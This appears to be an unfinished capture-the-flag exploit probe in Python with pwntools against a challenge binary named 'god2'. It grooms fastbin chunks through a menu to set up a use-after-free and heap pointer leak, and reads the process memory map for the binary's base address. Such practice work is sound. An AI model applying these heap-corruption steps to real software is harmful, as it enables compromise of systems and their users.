import sys,os; sys.path.insert(0,'/mnt/c/Users/ha/Downloads/pwn')
from dumper import G
from pwn import u64,p64
STEP=sys.argv[1] if len(sys.argv)>1 else 'cyc'
g=G('god2')
g.add(b'UNIQ777')
g.add(b'A1'); g.add(b'B2'); g.cook(b'Beef noodles'); g.add(b'YY'); g.add(b'Z9'); g.cook(b'Beef noodles')
for t in (b'B2',b'Z9',b'A1',b'YY'): g.rm(t)
g.add(b'CC')
g.cook(b'Beef noodles'); g.cook(b'Beef noodles'); g.cook(b'UNIQ777')   # drain,drain,D3@YY
g.add(b'R'*16+b'A'); g.add(b'SLOTXX')
g.sell(b'2')               # seed -> fb=[seed]
g.sell(b'3')               # sell D3 -> fb=[D3,seed], D3.fd=&seed, D3 still CC->next
if STEP=='leak':
    g.dump('after sell D3 (leak via show_recipes: CC->next title=heap)'); g.close(); sys.exit()
# read D3.fd from recipes via gdb? just add FD using the known god2 offset R+8
# For probe we hardcode: R = heap_base + 0x980 ; use maps base
g.sync()
base=None
for line in open('/proc/%d/maps'%g.p.pid):
    if line.rstrip().endswith(g.binname) and base is None: base=int(line.split('-')[0],16)
R=base+0x2050d0  # placeholder; real R addr computed below from heap
# find heap base from a known chunk: use foods_ptr region
# Simpler: recompute R from maps of heap via the dumper's known layout is hard here;
# instead add FD with a dummy then fix in exploit. Here just test list stays clean + cycle.
g.add(b'FDDDDD')           # FD clean add (placeholder title)
g.sell(b'0')               # intervening 0x40 -> head=BN
# rm D3 by its heap-byte title: we don't know it here; emulate by rm using the fake title.
# Instead, dump now to confirm FD is clean and list intact before the rm step.
g.dump('after FD clean + intervening sell (pre rm)'); g.close()
